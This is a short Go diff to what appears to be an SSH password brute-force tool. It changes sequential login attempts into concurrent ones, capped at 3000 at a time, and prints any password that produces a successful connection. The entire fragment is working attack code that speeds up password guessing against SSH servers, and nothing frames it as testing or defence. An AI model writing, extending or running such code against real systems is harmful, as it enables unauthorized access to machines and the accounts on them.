@@ -88,6 +88,8 @@ var rootCmd = &cobra.Command{
 		ctx, cancel := context.WithCancel(cmd.Context())
 		defer cancel()
 
+		limit := make(chan struct{}, 3000)
+
 		eg, egctx := errgroup.WithContext(ctx)
 
 		for _, crackerGen := range crackerGens {
@@ -106,14 +108,30 @@ var rootCmd = &cobra.Command{
 						},
 					}
 
-					conn, err := ssh.Dial("tcp", host+":"+strPort, config)
-					if err != nil {
+					select {
+					case <-egctx.Done():
 						return
+					case limit <- struct{}{}:
 					}
-					defer conn.Close()
-					cancel()
 
-					fmt.Printf("Successful connection to ssh server.  password: %s\n", pass)
+					eg.Go(func() (err error) {
+						defer func() {
+							select {
+							case <-egctx.Done():
+								return
+							case <-limit:
+							}
+						}()
+						conn, err := ssh.Dial("tcp", host+":"+strPort, config)
+						if err != nil {
+							return nil
+						}
+						defer conn.Close()
+						cancel()
+
+						fmt.Printf("Successful connection to ssh server.  password: %s\n", pass)
+						return nil
+					})
 				})
 			})
 		}
